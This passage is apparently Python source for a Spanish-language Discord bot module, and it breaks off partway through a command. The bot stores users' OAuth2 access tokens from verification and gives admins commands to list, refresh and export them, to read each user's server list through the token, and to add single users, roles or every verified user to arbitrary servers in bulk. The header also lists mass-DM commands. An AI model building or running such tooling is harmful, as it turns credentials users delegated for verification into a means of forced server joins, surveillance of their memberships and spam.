"""
Cog: Tokens / Red
──────────────────
Todos los comandos de gestión de tokens OAuth2 y operaciones en red.

━━━ Gestión de tokens ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  /tokens-lista       Lista paginada de todos los tokens
  /token-info         Info detallada del token de un usuario
  /tokens-stats       Estadísticas con barra de salud
  /tokens-limpiar     Elimina todos los tokens expirados
  /revocar-token      Elimina el token de un usuario concreto
  /exportar-tokens    Exporta la lista a un archivo .txt
  /infotokens         Panel interactivo completo

━━━ Unir a servidores ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  /unir-usuario       Añade un usuario a un servidor
  /unir-todos         Añade todos los verificados a un servidor
  /unir-rol           Añade los miembros de un rol a un servidor
  /unir-red           Añade un usuario a todos los servidores del bot
  /sincronizar-red    Sincroniza todos los tokens a todos los servidores

━━━ Mensajes ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  /mensaje-canal      Envía texto a un canal de otro servidor
  /anuncio-red        Envía un embed a otro servidor
  /dm-masivo          DM a todos con token válido
  /dm-servidor        DM a usuarios de un servidor concreto

━━━ Info de red ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  /mis-servidores     Lista todos los servidores del bot
  /guilds-usuario     Servidores de un usuario (vía token)
  /mapa-tokens        Cuántos tokens hay en cada servidor
"""

import asyncio
import io
import logging
import math
import time
from datetime import datetime, timezone

import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

import token_store
import utils

log = logging.getLogger("bot.tokens")

# Límite de Discord para Select menus
_POR_PAG = 25


# ─────────────────────────────────────────────────────────────────────────────
#  Helpers de UI
# ─────────────────────────────────────────────────────────────────────────────

def _barra(done: int, total: int, ancho: int = 20) -> str:
    if total == 0:
        return "░" * ancho
    filled = int(done / total * ancho)
    return "█" * filled + "░" * (ancho - filled)


def _embed_progreso(done: int, total: int, titulo: str, detalle: str = "") -> discord.Embed:
    pct   = int(done / total * 100) if total else 100
    embed = discord.Embed(title=titulo, color=discord.Color.blurple())
    embed.add_field(
        name=f"Progreso — {pct}%",
        value=f"`{_barra(done, total)}` {done}/{total}\n{detalle}",
        inline=False,
    )
    return embed


def _token_pages(
    tokens: dict,
    guild: discord.Guild | None,
    titulo: str,
    color: discord.Color,
    por_pagina: int = 9,
) -> list[discord.Embed]:
    items = list(tokens.items())
    if not items:
        return [discord.Embed(title=titulo, description="No hay tokens.", color=color)]

    ahora  = time.time()
    chunks = [items[i:i + por_pagina] for i in range(0, len(items), por_pagina)]
    pages  = []

    for idx, chunk in enumerate(chunks):
        embed = discord.Embed(title=titulo, color=color, timestamp=datetime.now(timezone.utc))
        for uid, data in chunk:
            member  = guild.get_member(int(uid)) if guild else None
            mention = member.mention if member else f"<@{uid}>"
            tag     = data.get("username", "Desconocido")
            valido  = data["expires_at"] > ahora
            exp_ts  = int(data["expires_at"])
            save_ts = int(data.get("saved_at", data["expires_at"] - 604800))
            embed.add_field(
                name=f"{'✅' if valido else '⏰'} {tag}",
                value=f"{mention}\n`{uid}`\n💾 <t:{save_ts}:d>  ⏱ <t:{exp_ts}:R>",
                inline=True,
            )
        embed.set_footer(text=f"Página {idx + 1}/{len(chunks)}  •  {len(items)} tokens en total")
        pages.append(embed)
    return pages


# ─────────────────────────────────────────────────────────────────────────────
#  ConfirmarView — botones Confirmar / Cancelar
# ─────────────────────────────────────────────────────────────────────────────

class ConfirmarView(discord.ui.View):
    def __init__(self, autor_id: int):
        super().__init__(timeout=30)
        self.autor_id  = autor_id
        self.confirmed: bool | None = None

    async def _check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.autor_id:
            await interaction.response.send_message(
                "Solo quien ejecutó el comando puede confirmar.", ephemeral=True
            )
            return False
        return True

    def _disable(self):
        for item in self.children:
            item.disabled = True

    @discord.ui.button(label="⚠️ Confirmar", style=discord.ButtonStyle.danger)
    async def btn_confirmar(self, interaction: discord.Interaction, _):
        if not await self._check(interaction): return
        self.confirmed = True
        self._disable()
        await interaction.response.edit_message(view=self)
        self.stop()

    @discord.ui.button(label="✖ Cancelar", style=discord.ButtonStyle.secondary)
    async def btn_cancelar(self, interaction: discord.Interaction, _):
        if not await self._check(interaction): return
        self.confirmed = False
        self._disable()
        await interaction.response.edit_message(content="❌ Operación cancelada.", embed=None, view=self)
        self.stop()

    async def on_timeout(self):
        self.confirmed = False
        self.stop()


# ─────────────────────────────────────────────────────────────────────────────
#  PaginaView — navegación de embeds paginados
# ─────────────────────────────────────────────────────────────────────────────

class PaginaView(discord.ui.View):
    def __init__(self, pages: list[discord.Embed], autor_id: int):
        super().__init__(timeout=120)
        self.pages    = pages
        self.current  = 0
        self.autor_id = autor_id
        self._sync()

    def _sync(self):
        self.btn_first.disabled = self.current == 0
        self.btn_prev.disabled  = self.current == 0
        self.btn_next.disabled  = self.current == len(self.pages) - 1
        self.btn_last.disabled  = self.current == len(self.pages) - 1

    async def _check(self, i: discord.Interaction) -> bool:
        if i.user.id != self.autor_id:
            await i.response.send_message("Solo quien ejecutó el comando puede navegar.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="⏮", style=discord.ButtonStyle.secondary)
    async def btn_first(self, i: discord.Interaction, _):
        if not await self._check(i): return
        self.current = 0; self._sync()
        await i.response.edit_message(embed=self.pages[self.current], view=self)

    @discord.ui.button(label="◀", style=discord.ButtonStyle.primary)
    async def btn_prev(self, i: discord.Interaction, _):
        if not await self._check(i): return
        self.current -= 1; self._sync()
        await i.response.edit_message(embed=self.pages[self.current], view=self)

    @discord.ui.button(label="▶", style=discord.ButtonStyle.primary)
    async def btn_next(self, i: discord.Interaction, _):
        if not await self._check(i): return
        self.current += 1; self._sync()
        await i.response.edit_message(embed=self.pages[self.current], view=self)

    @discord.ui.button(label="⏭", style=discord.ButtonStyle.secondary)
    async def btn_last(self, i: discord.Interaction, _):
        if not await self._check(i): return
        self.current = len(self.pages) - 1; self._sync()
        await i.response.edit_message(embed=self.pages[self.current], view=self)


# ─────────────────────────────────────────────────────────────────────────────
#  /infotokens — Embeds
# ─────────────────────────────────────────────────────────────────────────────

def _embed_lista(tokens: list[tuple[str, dict]], page: int, guild: discord.Guild | None) -> discord.Embed:
    ahora       = time.time()
    validos     = sum(1 for _, d in tokens if d["expires_at"] > ahora)
    total_pages = max(1, math.ceil(len(tokens) / _POR_PAG))

    embed = discord.Embed(
        title="🔑 Panel de Tokens",
        description=(
            f"**Total:** {len(tokens)}  •  **✅ Válidos:** {validos}  •  "
            f"**⏰ Expirados:** {len(tokens) - validos}\n\n"
            "Selecciona un usuario del menú desplegable para ver su info y gestionarlo."
        ),
        color=discord.Color.blurple(),
        timestamp=datetime.now(timezone.utc),
    )

    start = page * _POR_PAG
    chunk = tokens[start:start + _POR_PAG]
    for uid, data in chunk:
        member = guild.get_member(int(uid)) if guild else None
        nombre = data.get("username", "Desconocido")
        estado = "✅" if data["expires_at"] > ahora else "⏰"
        exp_ts = int(data["expires_at"])
        embed.add_field(
            name=f"{estado} {nombre}",
            value=f"{member.mention if member else f'<@{uid}>'}\n`{uid}`\n<t:{exp_ts}:R>",
            inline=True,
        )

    embed.set_footer(text=f"Página {page + 1}/{total_pages}  •  {len(chunk)} de {len(tokens)} mostrados")
    return embed


def _embed_detalle(uid: str, data: dict, guild: discord.Guild | None) -> discord.Embed:
    ahora   = time.time()
    valido  = data["expires_at"] > ahora
    exp_ts  = int(data["expires_at"])
    save_ts = int(data.get("saved_at", data["expires_at"] - 604800))
    member  = guild.get_member(int(uid)) if guild else None
    name    = data.get("username", "Desconocido")

    embed = discord.Embed(
        title=f"{'✅' if valido else '⏰'} {name}",
        color=discord.Color.green() if valido else discord.Color.red(),
        timestamp=datetime.now(timezone.utc),
    )
    if member:
        embed.set_thumbnail(url=member.display_avatar.url)

    embed.add_field(name="👤 Usuario",  value=f"{member.mention if member else 'No en servidor'}\n`{uid}`", inline=True)
    embed.add_field(name="🏷️ Tag",      value=name,                                                         inline=True)
    embed.add_field(name="📊 Estado",   value="✅ Válido" if valido else "⏰ Expirado",                      inline=True)
    embed.add_field(name="💾 Guardado", value=f"<t:{save_ts}:F>",                                           inline=True)
    embed.add_field(name="⏱️ Expira",   value=f"<t:{exp_ts}:F>\n<t:{exp_ts}:R>",                           inline=True)
    embed.add_field(name="🔑 Token",    value=f"||`{data['access_token'][:40]}…`||",                        inline=False)
    embed.set_footer(text="Usa los botones de abajo para gestionar este token.")
    return embed


# ─────────────────────────────────────────────────────────────────────────────
#  /infotokens — Modals
# ─────────────────────────────────────────────────────────────────────────────

class _DMModal(discord.ui.Modal, title="📨 Enviar DM"):
    titulo_f  = discord.ui.TextInput(label="Título (opcional)", required=False, max_length=256)
    mensaje_f = discord.ui.TextInput(label="Mensaje", style=discord.TextStyle.paragraph, max_length=2000)

    def __init__(self, uid: str, bot: commands.Bot):
        super().__init__()
        self.uid = uid
        self.bot = bot

    async def on_submit(self, interaction: discord.Interaction):
        try:
            user = await self.bot.fetch_user(int(self.uid))
            if self.titulo_f.value:
                await user.send(embed=discord.Embed(
                    title=self.titulo_f.value,
                    description=self.mensaje_f.value,
                    color=discord.Color.blurple(),
                    timestamp=datetime.now(timezone.utc),
                ))
            else:
                await user.send(self.mensaje_f.value)
            await interaction.response.send_message("✅ DM enviado correctamente.", ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("❌ El usuario tiene los DMs cerrados.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)


class _UnirModal(discord.ui.Modal, title="➕ Unir a servidor"):
    servidor_id_f = discord.ui.TextInput(label="ID del servidor destino", min_length=17, max_length=20)

    def __init__(self, uid: str):
        super().__init__()
        self.uid = uid

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            gid = int(self.servidor_id_f.value)
        except ValueError:
            await interaction.followup.send("❌ ID de servidor inválido.", ephemeral=True)
            return
        ok, msg = await utils.add_to_guild(int(self.uid), gid)
        await interaction.followup.send(
            embed=discord.Embed(
                title="✅ Éxito" if ok else "❌ Error",
                description=msg,
                color=discord.Color.green() if ok else discord.Color.red(),
            ),
            ephemeral=True,
        )


class _MensajeModal(discord.ui.Modal, title="💬 Enviar a canal de otro servidor"):
    servidor_id_f = discord.ui.TextInput(label="ID del servidor", min_length=17, max_length=20)
    canal_id_f    = discord.ui.TextInput(label="ID del canal",    min_length=17, max_length=20)
    mensaje_f     = discord.ui.TextInput(label="Mensaje", style=discord.TextStyle.paragraph, max_length=2000)

    def __init__(self, bot: commands.Bot):
        super().__init__()
        self.bot = bot

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            guild = self.bot.get_guild(int(self.servidor_id_f.value))
            canal = guild.get_channel(int(self.canal_id_f.value)) if guild else None
        except ValueError:
            await interaction.followup.send("❌ IDs inválidos.", ephemeral=True)
            return
        if not guild:
            await interaction.followup.send("❌ El bot no está en ese servidor.", ephemeral=True)
            return
        if not canal or not isinstance(canal, discord.TextChannel):
            await interaction.followup.send("❌ Canal no encontrado o no es de texto.", ephemeral=True)
            return
        try:
            await canal.send(self.mensaje_f.value)
            await interaction.followup.send(
                f"✅ Mensaje enviado en **{guild.name}** → `#{canal.name}`", ephemeral=True
            )
        except discord.Forbidden:
            await interaction.followup.send("❌ Sin permisos en ese canal.", ephemeral=True)


# ─────────────────────────────────────────────────────────────────────────────
#  /infotokens — AccionesView (botones de acción sobre un token)
# ─────────────────────────────────────────────────────────────────────────────

class AccionesView(discord.ui.View):
    """Vista con acciones para el token del usuario seleccionado."""

    def __init__(
        self,
        uid: str,
        data: dict,
        guild: discord.Guild | None,
        autor_id: int,
        bot: commands.Bot,
        parent: "InfoView",
    ):
        super().__init__(timeout=300)
        self.uid      = uid
        self.data     = data
        self.guild    = guild
        self.autor_id = autor_id
        self.bot      = bot
        self.parent   = parent

    async def _check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.autor_id:
            await interaction.response.send_message("Solo el autor puede interactuar.", ephemeral=True)
            return False
        return True

    # ── Enviar DM ─────────────────────────────────────────────────────────────
    @discord.ui.button(label="Enviar DM", emoji="📨", style=discord.ButtonStyle.primary, row=0)
    async def btn_dm(self, interaction: discord.Interaction, _):
        if not await self._check(interaction): return
        await interaction.response.send_modal(_DMModal(self.uid, self.bot))

    # ── Ver servidores ────────────────────────────────────────────────────────
    @discord.ui.button(label="Ver servidores", emoji="🌐", style=discord.ButtonStyle.secondary, row=0)
    async def btn_guilds(self, interaction: discord.Interaction, _):
        if not await self._check(interaction): return
        await interaction.response.defer(ephemeral=True)

        token = await utils.valid_token(int(self.uid))
        if not token:
            await interaction.followup.send("❌ Token inválido o expirado.", ephemeral=True)
            return

        guilds  = await utils.get_user_guilds(token)
        if not guilds:
            await interaction.followup.send(
                "⚠️ No se pudieron obtener los servidores (puede que el scope `guilds` no esté disponible).",
                ephemeral=True,
            )
            return

        bot_ids = {g.id for g in self.bot.guilds}
        name    = self.data.get("username", self.uid)
        embed   = discord.Embed(
            title=f"🌐 Servidores de {name} ({len(guilds)})",
            color=discord.Color.blurple(),
            timestamp=datetime.now(timezone.utc),
        )
        for g in guilds[:24]:
            en_bot = " 🤖" if int(g["id"]) in bot_ids else ""
            embed.add_field(name=f"{g['name']}{en_bot}", value=f"`{g['id']}`", inline=True)
        embed.set_footer(text="🤖 = el bot también está en ese servidor")
        await interaction.followup.send(embed=embed, ephemeral=True)

    # ── Unir a servidor ───────────────────────────────────────────────────────
    @discord.ui.button(label="Unir a servidor", emoji="➕", style=discord.ButtonStyle.success, row=0)
    async def btn_unir(self, interaction: discord.Interaction, _):
        if not await self._check(interaction): return
        await interaction.response.send_modal(_UnirModal(self.uid))

    # ── Mensaje a canal ───────────────────────────────────────────────────────
    @discord.ui.button(label="Msg a canal", emoji="💬", style=discord.ButtonStyle.secondary, row=1)
    async def btn_msg(self, interaction: discord.Interaction, _):
        if not await self._check(interaction): return
        await interaction.response.send_modal(_MensajeModal(self.bot))

    # ── Refrescar token ───────────────────────────────────────────────────────
    @discord.ui.button(label="Refrescar token", emoji="🔄", style=discord.ButtonStyle.secondary, row=1)
    async def btn_refresh(self, interaction: discord.Interaction, _):
        if not await self._check(interaction): return
        await interaction.response.defer(ephemeral=True)

        nuevo = await utils.refresh_token(int(self.uid))
        if nuevo:
            self.data = token_store.get_user(int(self.uid))
            await interaction.message.edit(embed=_embed_detalle(self.uid, self.data, self.guild), view=self)
            await interaction.followup.send("✅ Token refrescado correctamente.", ephemeral=True)
        else:
            await interaction.followup.send(
                "❌ No se pudo refrescar. El usuario debe reverificarse.", ephemeral=True
            )

    # ── Revocar token ─────────────────────────────────────────────────────────
    @discord.ui.button(label="Revocar token", emoji="🗑️", style=discord.ButtonStyle.danger, row=1)
    async def btn_revocar(self, interaction: discord.Interaction, _):
        if not await self._check(interaction): return

        # Guardar referencia al mensaje del panel ANTES de responder
        panel_msg = interaction.message
        name = self.data.get("username", self.uid)

        confirm = ConfirmarView(self.autor_id)
        await interaction.response.send_message(
            embed=discord.Embed(
                title="⚠️ Confirmar revocación",
                description=(
                    f"¿Eliminar el token de **{name}** (`{self.uid}`)?\n"
                    "El usuario deberá reverificarse para obtener uno nuevo."
                ),
                color=discord.Color.orange(),
            ),
            view=confirm,
            ephemeral=True,
        )
        await confirm.wait()
        if not confirm.confirmed:
            return

        token_store.remove_user(int(self.uid))
        log.info(f"Token revocado desde /infotokens: {self.uid} por {interaction.user}")

        # Recargar la lista y volver al panel principal
        # Usamos panel_msg.edit() directamente porque la interaction ya fue usada
        self.parent.tokens = _sorted_tokens(token_store.all_users())
        self.parent._rebuild_select()
        await panel_msg.edit(
            embed=_embed_lista(self.parent.tokens, self.parent.page, self.guild),
            view=self.parent,
        )

    # ── Volver al panel ───────────────────────────────────────────────────────
    @discord.ui.button(label="◀ Volver", style=discord.ButtonStyle.secondary, row=2)
    async def btn_volver(self, interaction: discord.Interaction, _):
        if not await self._check(interaction): return
        self.parent._rebuild_select()
        await interaction.response.edit_message(
            embed=_embed_lista(self.parent.tokens, self.parent.page, self.guild),
            view=self.parent,
        )


# ─────────────────────────────────────────────────────────────────────────────
#  /infotokens — InfoView (select + paginación)
# ─────────────────────────────────────────────────────────────────────────────

def _sorted_tokens(tokens: dict) -> list[tuple[str, dict]]:
    """Ordena tokens: válidos primero, luego por username."""
    ahora = time.time()
    items = list(tokens.items())
    items.sort(key=lambda x: (x[1]["expires_at"] < ahora, x[1].get("username", "").lower()))
    return items


class InfoView(discord.ui.View):
    """Vista principal de /infotokens: menú desplegable + paginación."""

    def __init__(
        self,
        tokens: list[tuple[str, dict]],
        guild: discord.Guild | None,
        autor_id: int,
        bot: commands.Bot,
    ):
        super().__init__(timeout=300)
        self.tokens   = tokens
        self.guild    = guild
        self.autor_id = autor_id
        self.bot      = bot
        self.page     = 0
        self._rebuild_select()

    def _rebuild_select(self):
        """Reconstruye el select menu y los botones de paginación."""
        self.clear_items()

        ahora       = time.time()
        total_pages = max(1, math.ceil(len(self.tokens) / _POR_PAG))

        # Si la página actual quedó vacía (después de revocar), retroceder
        if self.page >= total_pages:
            self.page = max(0, total_pages - 1)

        start = self.page * _POR_PAG
        chunk = self.tokens[start:start + _POR_PAG]

        if chunk:
            opciones = [
                discord.SelectOption(
                    label=data.get("username", f"ID {uid}")[:100],
                    value=uid,
                    description=f"{'✅ Válido' if data['expires_at'] > ahora else '⏰ Expirado'}  •  ID: {uid}"[:100],
                    emoji="✅" if data["expires_at"] > ahora else "⏰",
                )
                for uid, data in chunk
            ]
            select = discord.ui.Select(
                placeholder="🔍 Selecciona un usuario...",
                options=opciones,
                row=0,
            )
            select.callback = self._on_select
            self.add_item(select)

        # Botones de paginación (solo si hay más de 25 tokens)
        if len(self.tokens) > _POR_PAG:
            btn_prev = discord.ui.Button(
                label="◀ Anterior",
                style=discord.ButtonStyle.secondary,
                disabled=(self.page == 0),
                row=1,
            )
            btn_prev.callback = self._prev

            btn_info = discord.ui.Button(
                label=f"Pág {self.page + 1}/{total_pages}",
                style=discord.ButtonStyle.secondary,
                disabled=True,
                row=1,
            )

            btn_next = discord.ui.Button(
                label="Siguiente ▶",
                style=discord.ButtonStyle.secondary,
                disabled=(self.page >= total_pages - 1),
                row=1,
            )
            btn_next.callback = self._next

            self.add_item(btn_prev)
            self.add_item(btn_info)
            self.add_item(btn_next)

    async def _check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.autor_id:
            await interaction.response.send_message("Solo el autor puede interactuar.", ephemeral=True)
            return False
        return True

    async def _on_select(self, interaction: discord.Interaction):
        if not await self._check(interaction): return
        uid  = interaction.data["values"][0]
        data = token_store.get_user(int(uid))
        if not data:
            await interaction.response.send_message(
                "❌ Token no encontrado (puede haberse revocado).", ephemeral=True
            )
            return
        embed = _embed_detalle(uid, data, self.guild)
        view  = AccionesView(uid, data, self.guild, self.autor_id, self.bot, parent=self)
        await interaction.response.edit_message(embed=embed, view=view)

    async def _prev(self, interaction: discord.Interaction):
        if not await self._check(interaction): return
        self.page -= 1
        self._rebuild_select()
        await interaction.response.edit_message(
            embed=_embed_lista(self.tokens, self.page, self.guild), view=self
        )

    async def _next(self, interaction: discord.Interaction):
        if not await self._check(interaction): return
        self.page += 1
        self._rebuild_select()
        await interaction.response.edit_message(
            embed=_embed_lista(self.tokens, self.page, self.guild), view=self
        )

    async def on_timeout(self):
        self.clear_items()


# ─────────────────────────────────────────────────────────────────────────────
#  Cog
# ─────────────────────────────────────────────────────────────────────────────

class Tokens(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    # ══════════════════════════════════════════════════════════════════════════
    #  GESTIÓN DE TOKENS
    # ══════════════════════════════════════════════════════════════════════════

    @app_commands.command(name="tokens-lista", description="[Admin] Lista paginada de todos los tokens.")
    @app_commands.describe(solo_validos="Mostrar solo tokens no expirados.")
    @app_commands.checks.has_permissions(administrator=True)
    async def tokens_lista(self, interaction: discord.Interaction, solo_validos: bool = False):
        await interaction.response.defer(ephemeral=True)
        tokens = token_store.get_valid() if solo_validos else token_store.all_users()
        titulo = "🔑 Tokens válidos" if solo_validos else "🔑 Todos los tokens"
        color  = discord.Color.green() if solo_validos else discord.Color.blurple()
        pages  = _token_pages(tokens, interaction.guild, titulo, color)
        view   = PaginaView(pages, interaction.user.id) if len(pages) > 1 else None
        await interaction.followup.send(embed=pages[0], view=view, ephemeral=True)

    @app_commands.command(name="token-info", description="[Admin] Info detallada del token de un usuario.")
    @app_commands.describe(usuario="Usuario a consultar.")
    @app_commands.checks.has_permissions(administrator=True)
    async def token_info(self, interaction: discord.Interaction, usuario: discord.Member):
        record = token_store.get_user(usuario.id)
        if not record:
            await interaction.response.send_message(
                f"❌ {usuario.mention} no tiene token guardado.", ephemeral=True
            )
            return

        ahora   = time.time()
        valido  = record["expires_at"] > ahora
        exp_ts  = int(record["expires_at"])
        save_ts = int(record.get("saved_at", record["expires_at"] - 604800))

        embed = discord.Embed(
            title=f"🔑 Token de {usuario.display_name}",
            color=discord.Color.green() if valido else discord.Color.red(),
            timestamp=datetime.now(timezone.utc),
        )
        embed.set_thumbnail(url=usuario.display_avatar.url)
        embed.add_field(name="Usuario",  value=f"{usuario.mention}\n`{usuario.id}`",        inline=True)
        embed.add_field(name="Tag",      value=record.get("username", "?"),                  inline=True)
        embed.add_field(name="Estado",   value="✅ Válido" if valido else "⏰ Expirado",      inline=True)
        embed.add_field(name="Guardado", value=f"<t:{save_ts}:F>",                           inline=True)
        embed.add_field(name="Expira",   value=f"<t:{exp_ts}:F>\n<t:{exp_ts}:R>",           inline=True)
        embed.add_field(name="Token",    value=f"||`{record['access_token'][:35]}…`||",      inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="tokens-stats", description="[Admin] Estadísticas de todos los tokens.")
    @app_commands.checks.has_permissions(administrator=True)
    async def tokens_stats(self, interaction: discord.Interaction):
        total, validos, expirados = token_store.count()
        pct   = int(validos / total * 100) if total else 0
        embed = discord.Embed(
            title="📊 Estadísticas de tokens OAuth2",
            color=discord.Color.blurple(),
            timestamp=datetime.now(timezone.utc),
        )
        embed.add_field(name="Total",          value=f"**{total}**",     inline=True)
        embed.add_field(name="✅ Válidos",      value=f"**{validos}**",   inline=True)
        embed.add_field(name="⏰ Expirados",    value=f"**{expirados}**", inline=True)
        embed.add_field(name=f"Salud — {pct}%", value=f"`{_barra(validos, total)}`", inline=False)
        embed.set_footer(text="Los expirados se refrescan automáticamente al usarlos.")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="tokens-limpiar", description="[Admin] Elimina todos los tokens expirados.")
    @app_commands.checks.has_permissions(administrator=True)
    async def tokens_limpiar(self, interaction: discord.Interaction):
        eliminados        = token_store.clean_expired()
        total, validos, _ = token_store.count()
        embed = discord.Embed(
            title="🧹 Limpieza completada",
            color=discord.Color.green() if eliminados > 0 else discord.Color.greyple(),
            timestamp=datetime.now(timezone.utc),
        )
        embed.add_field(name="Eliminados",     value=str(eliminados), inline=True)
        embed.add_field(name="Total restante", value=str(total),      inline=True)
        embed.add_field(name="Válidos",        value=str(validos),    inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="revocar-token", description="[Admin] Elimina el token de un usuario.")
    @app_commands.describe(usuario="Usuario cuyo token eliminar.")
    @app_commands.checks.has_permissions(administrator=True)
    async def revocar_token(self, interaction: discord.Interaction, usuario: discord.Member):
        if token_store.remove_user(usuario.id):
            log.info(f"Token revocado: {usuario} ({usuario.id}) por {interaction.user}")
            await interaction.response.send_message(
                f"✅ Token de {usuario.mention} eliminado. Deberá reverificarse.", ephemeral=True
            )
        else:
            await interaction.response.send_message(
                f"⚠️ {usuario.mention} no tiene token guardado.", ephemeral=True
            )

    @app_commands.command(name="exportar-tokens", description="[Admin] Exporta todos los tokens a un archivo .txt.")
    @app_commands.checks.has_permissions(administrator=True)
    async def exportar_tokens(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        tokens = token_store.all_users()
        if not tokens:
            await interaction.followup.send("⚠️ No hay tokens guardados.", ephemeral=True)
            return

        ahora  = time.time()
        lineas = [
            "═" * 60,
            f"  EXPORT DE TOKENS — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"  Total: {len(tokens)} tokens",
            "═" * 60,
            "",
        ]
        for uid, data in tokens.items():
            estado = "VÁLIDO" if data["expires_at"] > ahora else "EXPIRADO"
            exp    = datetime.fromtimestamp(data["expires_at"]).strftime("%Y-%m-%d %H:%M")
            saved  = datetime.fromtimestamp(data.get("saved_at", 0)).strftime("%Y-%m-%d %H:%M")
            lineas += [
                f"Usuario  : {data.get('username', '?')} (ID: {uid})",
                f"Estado   : {estado}",
                f"Guardado : {saved}",
                f"Expira   : {exp}",
                f"Token    : {data['access_token'][:40]}...",
                "─" * 60,
            ]

        archivo = discord.File(
            io.BytesIO("\n".join(lineas).encode("utf-8")),
            filename="tokens_export.txt",
        )
        await interaction.followup.send(
            f"📄 Export de **{len(tokens)}** tokens:", file=archivo, ephemeral=True
        )

    @app_commands.command(name="infotokens", description="[Admin] Panel interactivo con todos los tokens.")
    @app_commands.checks.has_permissions(administrator=True)
    async def infotokens(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        todos = _sorted_tokens(token_store.all_users())
        if not todos:
            await interaction.followup.send("⚠️ No hay tokens guardados.", ephemeral=True)
            return
        embed = _embed_lista(todos, 0, interaction.guild)
        view  = InfoView(todos, interaction.guild, interaction.user.id, self.bot)
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)

    # ══════════════════════════════════════════════════════════════════════════
    #  UNIR A SERVIDORES
    # ══════════════════════════════════════════════════════════════════════════

    @app_commands.command(name="unir-usuario", description="[Admin] Añade un usuario a otro servidor.")
    @app_commands.describe(usuario="Usuario.", servidor_id="ID del servidor destino.")
    @app_commands.checks.has_permissions(administrator=True)
    async def unir_usuario(self, interaction: discord.Interaction, usuario: discord.Member, servidor_id: str):
        await interaction.response.defer(ephemeral=True)
        try:
            gid = int(servidor_id)
        except ValueError:
            await interaction.followup.send("❌ ID de servidor inválido.", ephemeral=True)
            return
        ok, msg = await utils.add_to_guild(usuario.id, gid)
        await interaction.followup.send(
            embed=discord.Embed(
                title="✅ Éxito" if ok else "❌ Error",
                description=f"**Usuario:** {usuario.mention} (`{usuario.id}`)\n**Servidor:** `{gid}`\n\n{'✅' if ok else '❌'} {msg}",
                color=discord.Color.green() if ok else discord.Color.red(),
                timestamp=datetime.now(timezone.utc),
            ),
            ephemeral=True,
        )

    @app_commands.command(name="unir-todos", description="[Admin] Añade todos los usuarios con token a otro servidor.")
    @app_commands.describe(servidor_id="ID del servidor destino.")
    @app_commands.checks.has_permissions(administrator=True)
    async def unir_todos(self, interaction: discord.Interaction, servidor_id: str):
        await interaction.response.defer(ephemeral=True)
        try:
            gid = int(servidor_id)
        except ValueError:
            await interaction.followup.send("❌ ID inválido.", ephemeral=True)
            return

        tokens = list(token_store.get_valid().keys())
        if not tokens:
            await interaction.followup.send("⚠️ No hay tokens válidos.", ephemeral=True)
            return

        confirm = ConfirmarView(interaction.user.id)
        await interaction.followup.send(
            embed=discord.Embed(
                title="⚠️ Operación masiva",
                description=f"Se añadirán **{len(tokens)} usuarios** al servidor `{gid}`.\nEsta acción no se puede deshacer.",
                color=discord.Color.orange(),
            ),
            view=confirm, ephemeral=True,
        )
        await confirm.wait()
        if not confirm.confirmed:
            return

        progress = await interaction.followup.send(
            embed=_embed_progreso(0, len(tokens), "⏳ Añadiendo usuarios..."), ephemeral=True
        )
        ok = fail = 0
        async with aiohttp.ClientSession() as session:
            for i, uid in enumerate(tokens):
                exito, _ = await utils.add_to_guild(int(uid), gid, session=session)
                if exito: ok += 1
                else:     fail += 1
                if i % 5 == 0 or i == len(tokens) - 1:
                    await progress.edit(
                        embed=_embed_progreso(i + 1, len(tokens), "⏳ Añadiendo...", f"✅ {ok}  ❌ {fail}")
                    )
                await asyncio.sleep(0.5)

        await interaction.followup.send(
            embed=discord.Embed(
                title="📊 Completado",
                description=f"✅ Añadidos: {ok}\n❌ Errores: {fail}",
                color=discord.Color.green() if fail == 0 else discord.Color.orange(),
                timestamp=datetime.now(timezone.utc),
            ),
            ephemeral=True,
        )

    @app_commands.command(name="unir-rol", description="[Admin] Añade los miembros de un rol a otro servidor.")
    @app_commands.describe(rol="Rol.", servidor_id="ID del servidor destino.")
    @app_commands.checks.has_permissions(administrator=True)
    async def unir_rol(self, interaction: discord.Interaction, rol: discord.Role, servidor_id: str):
        await interaction.response.defer(ephemeral=True)
        try:
            gid = int(servidor_id)
        except ValueError:
            await interaction.followup.send("❌ ID inválido.", ephemeral=True)
            return

        miembros = [m for m in rol.members if not m.bot and token_store.get_user(m.id)]
        if not miembros:
            await interaction.followup.send(
                f"⚠️ Ningún miembro de {rol.mention} tiene token guardado.", ephemeral=True
            )
            return

        confirm = ConfirmarView(interaction.user.id)
        await interaction.followup.send(
            embed=discord.Embed(
                title="⚠️ Operación masiva",
                description=f"Se añadirán **{len(miembros)} miembros** de {rol.mention} al servidor `{gid}`.",
                color=discord.Color.orange(),
            ),
            view=confirm, ephemeral=True,
        )
        await confirm.wait()
        if not confirm.confirmed:
            return

        progress = await interaction.followup.send(
            embed=_embed_progreso(0, len(miembros), f"⏳ Procesando {rol.name}..."), ephemeral=True
        )
        ok = fail = 0
        async with aiohttp.ClientSession() as session:
            for i, m in enumerate(miembros):
                exito, _ = await utils.add_to_guild(m.id, gid, session=session)
                if exito: ok += 1
                else:     fail += 1
                if i % 5 == 0 or i == len(miembros) - 1:
